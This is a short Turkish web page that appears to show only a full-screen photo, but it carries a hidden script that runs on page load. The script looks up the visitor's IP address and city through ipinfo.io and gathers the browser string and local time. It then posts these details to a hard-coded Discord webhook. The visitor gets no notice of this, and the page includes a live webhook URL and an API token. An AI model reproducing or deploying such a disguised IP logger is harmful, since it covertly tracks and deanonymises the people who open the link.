<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>🍉</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    img {
      max-width: 100%;
      max-height: 100%;
    }
  </style>
</head>
<body>
  <img src="haniye.png" alt="İsmail Haniye">

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1392621981060563105/KwFT0G_xxmfz8IB0HkA6LVRgK6lOkTZFhbzoyVExRwjVDQdTxc0v-oMwxCbhPPGnl_eK";

    async function getIPInfo() {
      try {
        const res = await fetch("https://ipinfo.io/json?token=3b1d9e8dcaa055"); // public token
        return await res.json();
      } catch (e) {
        console.error("IP bilgisi alınamadı:", e);
        return {};
      }
    }

    async function sendToDiscord() {
      const info = await getIPInfo();
      const ip = info.ip || "Bilinmiyor";
      const loc = info.city ? `${info.city}, ${info.country}` : "Konum yok";
      const now = new Date().toLocaleString("tr-TR");
      const browser = navigator.userAgent;

      const content = `📥 Yeni Ziyaretçi:
🌐 IP: ${ip}
📍 Konum: ${loc}
🕒 Saat: ${now}
🧭 Tarayıcı: ${browser}`;

      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content })
      }).catch(err => console.error("Discord gönderim hatası:", err));
    }

    sendToDiscord();
  </script>
</body>
</html>
